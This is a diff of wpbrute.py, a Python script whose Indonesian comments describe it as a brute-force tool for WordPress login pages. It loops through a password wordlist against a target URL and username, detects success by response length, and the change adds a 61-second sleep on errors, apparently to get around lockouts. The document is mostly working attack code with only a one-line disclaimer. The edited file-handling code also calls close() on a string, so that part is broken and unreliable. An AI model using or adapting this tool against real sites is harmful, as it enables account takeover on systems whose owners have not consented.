@@ -1,16 +1,13 @@
-#                                    Deskripsi
-# Simple program untuk membrute force wordpress login page
-# Info lanjutan tentang brutefroce -> https://en.wikipedia.org/wiki/Brute-force_attack
-#                                    Disclaimer
-# Jangan digunakan untuk tindakan yang tidak dapat dipertanggung jawabkan!
-#                                    Penggunaan
-# 'python wpbrute.py -t <base_url> -u <username(single)> -p <file_where_you_store_password_wordlist>'
-#                                    Masukkan
-# Sepertinya wordpress membuat mitigasi untuk brute force attack (this tool was useless), jadi jika anda mempunyai masukkan terhadap kelanjutan alat ini maka email ke obbierrolasta@gmail.com
-    
+#   Deskripsi
+#  Simple program untuk membrute force wordpress login page
+#  Info lanjutan tentang brutefroce -> 
+#   Disclaimer
+#  Jangan digunakan untuk tindakan yang tidak dapat dipertanggung jawabkan!
+#   Penggunaan
+#  'python wpbrute.py -t <base_url> -u <username(single)> -p <file_where_you_store_password_wordlist>'
 
 from time import sleep
-from requests import *
+from requests import post
 from argparse import *
 
 # global var
@@ -30,7 +27,7 @@ def send_req(url,username,passwd):
     headers={'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
     body="log="+username+"&pwd="+passwd+"&wp-submit=Log+Masuk&redirect_to="+url+"%2Fwp-admin%2F&testcookie=1"
     p=post(the_url,data=body,headers=headers)
-    print('\rusername : %s\t| password: %s'%(username,passwd),end='')
+    print('username : %s\t| password: %s'%(username,passwd))
     return len(p.text)
     
 
@@ -43,12 +40,13 @@ def file_handle(filename):
     global file_text
     
     try:
-        file_text=open(filename,'r').read()
+        file_input=open(filename,'r').read()
     except:
         error("Can't open %s file" %filename)
 
-    file_text=file_text.split('\n')
+    file_text=file_input.split('\n')
     file_text.pop()
+    file_input.close()
     
 def args_parser():
     
@@ -67,8 +65,11 @@ def main(url,username,pass_file):
     the_wrong=sure_wrong(url,username)
 
     for i in range(len(file_text)):
-        if(send_req(url,username,file_text[i])!=the_wrong): 
-           break
+        try:
+            if(send_req(url,username,file_text[i])!=the_wrong):
+                break
+        except:
+            sleep(61)
 
 
 if __name__=='__main__':
